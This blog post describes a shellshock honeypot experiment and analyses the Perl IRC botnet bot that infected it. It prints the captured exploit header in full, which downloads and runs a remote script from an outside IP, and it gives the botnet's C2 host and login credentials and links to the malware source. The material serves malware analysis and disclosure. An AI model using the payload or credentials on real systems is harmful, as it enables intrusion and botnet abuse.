---
layout: post
title: "A close look at an operating botnet"
description: ""
tags: [Malware, Data]
image: /assets/images/botnet/cover.png
---
{% include JB/setup %}

For those that don't know, a [botnet](https://en.wikipedia.org/wiki/Botnet) is a network of hacked computers that somehow connect
back to a command and control server which instructs the network to conduct malicious activities like DDOS attacks, phishing, or spam.

# What happened

This past summer, I decided to set up a honey pot server.  I hadn't done something like
that before and I was curious to see what would show up.

I set up a fresh Digital Ocean instance and installed a vulnerability that could be
remotely exploited.  I choose to use the [shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
bug and installed an [older version of bash](http://ftp.gnu.org/gnu/bash/).  Shellshock was a vulnerability in Bash that
would execute code in a environment variable.  This can easily be exploited remotely because of how CGI web servers
pass arguments through environment variables.

After installing Bash 4.2, I set up an Apache web server to serve CGI.  So common URL's
and 404's would all map to one simple, shellshock-vulnerable script:

```bash
#!/bin/bash
echo -e "Content-type:text/html\r\n\r\n"
echo "Hi $HTTP_USER_AGENT"
```

Functionally the script just returns a text page saying hi to whatever the user agent string was.  But if an HTTP request
were to look something like this:

```
GET /hello HTTP/1.1
Host:        104.131.107.238
User-Agent:  () { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://23.229.121.189/ex;curl -O http://23.229.121.189/ex;wget http://23.229.121.189/ex;perl /tmp/ex*;perl ex;rm -rf /tmp/ex*"
```

Then Bash 4.2 will execute the code in the User-Agent string, which downloads a Perl script, [ex](https://github.com/conorpp/fluffy-barnacle/blob/master/malware/ex), and runs it.

This after leaving the server running for a couple months, that is exactly what happened.

# Analysis

To summarize the Perl script, it's about 500 lines, connects to a server, `wileful.com`, and listens for commands.
[Some of the commands](https://github.com/conorpp/fluffy-barnacle/blob/master/malware/ex#L298) it looks for
include `tcpflood`, `eval`, and `shell`.  This looks like functionality for a botnet bot.  

It also implements some stealth.  Upon running the program,
it immediately [forks](ihttps://github.com/conorpp/fluffy-barnacle/blob/master/malware/ex#L39) a `/usr/sbin/httpd` process,
overwrites it with the Perl process using `exec`, and detaches from the parent process so it
can run independently in the background.

So you won't be able to see a new perl process running.  Instead, a new `/usr/sbin/httpd` process will be running.

```bash
root@b0b6000146fa:~# perl ex
root@b0b6000146fa:~# ps aux |grep perl
root        31  0.0  0.0   8860   648 ?        S+   16:30   0:00 grep --color=auto perl
root@b0b6000146fa:~# ps aux |grep httpd
root        29  0.0  0.0  24516  3856 ?        S    16:30   0:00 /usr/sbin/httpd
root        33  0.0  0.0   8860   644 ?        S+   16:30   0:00 grep --color=auto httpd
```

If you check the CPU usage of processes, however, `/usr/sbin/httpd` sticks out like a sore thumb because it
[polls the server socket with no timeout](https://github.com/conorpp/fluffy-barnacle/blob/master/malware/ex#L83)
after it connects.  This spins the CPU (oops).

```
# Output from top
  PID USER      PR  NI    VIRT    RES    SHR S   %CPU %MEM     TIME+    COMMAND
  8440 root     20   0   24984   3696    408 R   99.9  0.7     1921:38  /usr/sbin/httpd
```

I wanted to see what the program communicated with the server so I put it in a docker container and ran tcpdump.
After it initially connected with the server, these messages were sent:

```bash
# Bot  (5.9.118.150 is wileful.com)
USER GNU 104.131.107.238 5.9.118.150 :GN
PASS swedenrocks
# Server
:Unreal.conf NOTICE AUTH :*** Looking up your hostname...
:Unreal.conf NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:Unreal.conf 433 * GNU :Nickname is already in use.
NICK GNU4387
# Server
PING :DEFB9868
# Bot
PONG :DEFB9868
# Server
:Unreal.conf 001 GNU4387 :Welcome to the XpowerHost IRC Network GNU4387!GNU@104.131.107.238
:Unreal.conf 002 GNU4387 :Your host is Unreal.conf, running version Unreal3.2.10.5
:Unreal.conf 003 GNU4387 :This server was created Mon Sep 28 2015 at 20:41:48 EDT
```

Some of you may immediately recognize this as IRC.  This botnet seems kind of old school: no SSL
and controlled over IRC.

Well it looks like I have a username, password, and server address.  Why don't I try logging
into the botnet with a regular IRC client?

I fired up another docker instance, [Weechat](https://weechat.org/), and a tor proxy.  After
connecting to `irc://GNU:swedenrocks@wileful.com:443`, this is what I saw:

![Connected to botnet](https://i.imgur.com/undefined.png "Connected to a botnet")

Wow, there's a total of 977 connected 'users' and 6 different channels.  As seen from tcpdump, my bot was instructed
to join channel `#113` so I figured I would do the same:

![Channel #113](https://i.imgur.com/o6MzqGl.png "Channel #113")

Either all 932 clients in the channel are pretty unoriginal when coming up with a nick or the bots are assigned a nick formatted like `GNU<ID>`.
Everyone is really shy too, because no one says anything.  After idling in the channel for a few minutes, this is all to be
seen:

![Just leaving and joining](https://i.imgur.com/5cJDsy5.png "Just leaving and joining")

Looks like bots are actively leaving and joining.  I suspect that the operaters were moving around the bots
or were continually exploiting shellshock vulnerable machines like my honey pot.

I wanted to see if I could send commands to the botnet since I had access to the channels, but after
a couple hours of unfurling the perl script, I discovered that it [authenticates](https://github.com/conorpp/fluffy-barnacle/blob/master/malware/ex#L127) commands based on the
[servername and nickname in the IRC message](https://tools.ietf.org/html/rfc2812#section-2.3.1).  I
could not spoof this since it was something only an operator on the IRC network could do.

# Back to the infected honey pot

I let my infected honey pot run for a few days and I checked out
the IRC tranactions in the pcap logs.  On intervals it would do the following:

* Download a script to send emails with attachments.
* Download a list of email addresses.
* Run the script with the list of emails and possibly other files.

This is probably for phishing attacks or spam.  No DOS attacks.

# Conclusion

I didn't want my honey pot to be contributing to illegal activities, so I shut it down.

It wasn't long before I couldn't log in to the IRC network on `wileful.com`.  

![No more access](https://i.imgur.com/bhKCFjm.png "No more access")

At first I thought I got
locked out, but after scanning it from multiple different IP addresses I never used before,
it was still unresponsive.  I suspect that the botnet moved to another server or stopped accepting new connections.


My setup for the honey pot and my results from this analysis can be found [here](https://github.com/conorpp/fluffy-barnacle).
If you have any similar experience with this or know more, please send me a message. I'd like to learn more.
